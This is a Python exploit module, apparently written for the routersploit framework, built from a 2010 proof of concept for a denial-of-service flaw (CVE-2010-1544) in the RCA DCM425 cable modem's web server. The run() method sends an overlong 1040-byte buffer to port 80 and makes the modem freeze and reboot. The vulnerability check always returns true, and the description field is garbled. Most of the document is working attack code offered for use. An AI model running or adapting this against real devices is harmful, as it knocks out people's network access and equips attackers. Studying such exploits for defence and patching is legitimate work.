#!/usr/bin/python
# Title: RCA DCM425 Cable Modem micro_httpd DoS/PoC
# Date: 02/27/10
# Author: ad0nis  ad0nis@hackermail.com
# Info: This script causes a Denial of Service on a DCM425 cable modem.
# Sending 1040 bytes causes a reboot of the device after a few seconds
# of it freezing up. I believe this may lead to remote code execution
# but I did not bother to test it further.

# By default, this cable modem has an IP address of 192.168.100.1

# There are two different but similar models of this router, the only
# difference I see between them is that one has an On/Off button on the
# front. The one I discovered this on is the one without a button. I
# have not tested this on the other model.

# Thanks to ShadowHatesYou for the inspiration to look closer at the
# little black box on my network.

import sys, socket
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")



    __info__ = {

        "name": "CVE-2010-1544",
        "description": " RCADCM425 is a broadband cable modem. RCADCM425 cable modem micro_httpd  "
                       " A remote denial of service vulnerability. A remote attacker could 80 / TCP  "
                       " micro_httpd long service on the port to send the request packet to "
                       " cause the device to reboot DCM425modem default listening to pass. ",
        "authors": (
            "ad0nis",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/11597",
        ),
        "devices": (
            "RCADCM425","CVE-2010-1544"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            #target = sys.argv[1]
            buffer = ( b"\x41" * 1040 )
            print_status("Sending 1040 A's to" ,self.target, "on port 80\n")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target,80))
            s.send(buffer)
            s.close()
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
